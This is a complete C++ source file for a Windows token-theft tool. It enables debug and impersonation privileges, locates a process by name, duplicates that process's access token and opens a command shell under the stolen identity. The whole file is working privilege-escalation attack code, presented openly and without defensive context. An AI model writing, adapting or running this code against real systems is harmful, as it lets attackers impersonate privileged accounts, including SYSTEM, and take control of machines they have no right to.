#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <tchar.h>
#include <vector>

// Function to enable a privilege
bool EnablePrivilege(HANDLE hToken, LPCWSTR privilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValue(NULL, privilege, &luid)) {
        std::cerr << "Failed to lookup privilege: " << privilege << ". Error: " << GetLastError() << std::endl;
        return false;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        std::cerr << "Failed to adjust privilege: " << privilege << ". Error: " << GetLastError() << std::endl;
        return false;
    }
    return true;
}

// Function to get process ID from name
std::wstring StringToWString(const std::string& str) {
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    std::wstring wstr(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wstr[0], size_needed);
    return wstr;
}

DWORD GetProcessIDByName(const std::string& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create process snapshot." << std::endl;
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            std::wstring wProcessName = StringToWString(processName);
            if (_wcsicmp(pe32.szExeFile, wProcessName.c_str()) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0;
}

// Function to steal token and create a new process
bool StealTokenAndSpawn(DWORD targetPID) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPID);
    if (!hProcess) {
        std::cerr << "Failed to open target process. Error: " << GetLastError() << std::endl;
        return false;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
        std::cerr << "Failed to open process token. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hDupToken;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
        std::cerr << "Failed to duplicate token. Error: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return false;
    }

    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &si, &pi)) {
        std::cerr << "Failed to create process with stolen token. Error: " << GetLastError() << std::endl;
        CloseHandle(hDupToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return false;
    }

    std::cout << "Process created successfully!" << std::endl;
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return true;
}

int main(int argc, char* argv[]) {
    if (argc < 3 || (std::string(argv[1]) != "--process" && std::string(argv[1]) != "-p")) {
        std::cerr << "Usage: " << argv[0] << " --process <process_name>" << std::endl;
        return 1;
    }

    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "Failed to open current process token. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Enable SeDebugPrivilege and SeImpersonatePrivilege
    EnablePrivilege(hToken, L"SeDebugPrivilege");
    EnablePrivilege(hToken, L"SeImpersonatePrivilege");
    CloseHandle(hToken);

    std::string processName = argv[2];
    DWORD targetPID = GetProcessIDByName(processName);

    if (targetPID == 0) {
        std::cerr << "Process not found: " << processName << std::endl;
        return 1;
    }

    std::cout << "Target process ID: " << targetPID << std::endl;
    if (!StealTokenAndSpawn(targetPID)) {
        std::cerr << "Failed to steal token and launch new process." << std::endl;
        return 1;
    }

    return 0;
}
